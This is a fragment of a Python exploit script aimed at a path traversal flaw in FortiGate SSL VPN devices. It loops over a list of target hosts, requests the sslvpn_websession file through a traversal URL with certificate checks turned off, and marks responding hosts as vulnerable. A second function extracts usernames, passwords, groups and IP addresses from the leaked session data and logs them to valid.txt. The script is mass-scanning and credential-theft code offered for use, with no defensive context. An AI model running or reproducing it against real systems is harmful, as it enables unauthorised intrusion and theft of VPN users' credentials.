...
def exploit():
	targets = open("list.txt", "r").readlines()
	target = [lines.replace("\n", "") for lines in targets]
	print('[*] '+str(target)+' processing')
	for L in target:
		print (L)
		try:
			url = 'https://'+str(L)+'/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
			req = urllib.request.urlopen(url, None, context=NOSSL, timeout=5)
			result = req.read()
			if req.code == int(200) and str('var fgt_lang =') in str(result):
				subjectCN = getSubjectCN(L)
				print('[!] '+str(L)+' ('+subjectCN+') appears to be vulnerable ('+str(len(result))+') bytes returned')
				parse(str(L), result, subjectCN)
			else:
				print('[!] '+str(L)+' does not appear to be vulnerable')
		except urllib.error.HTTPError as e:
			print('[!] '+str(L)+' does not appear to be vulnerable ('+str(e.code)+', +'+str(e.reason)+')')
		except urllib.error.URLError as e:
			print('[!] '+str(L)+' does not appear to be vulnerable (URL seems to be invalid)')
		except TimeoutError:
			print('[!] '+str(L)+' Timed Out')
		except:
			print('[!] '+str(L)+' unhandled error :(')
...
def grabuser(target, process, frombyte, subjectCN):	
	...
	if isIP(extip):
		...
		s = ('[!] '+str(target)+' ('+subjectCN+') USERFOUND U:'+str(username)+', P:'+str(password)+', G:'+str(group)+', IP:'+str(extip))
		print(s)
		f = open('valid.txt','a+')
		f.write(s + "\n")
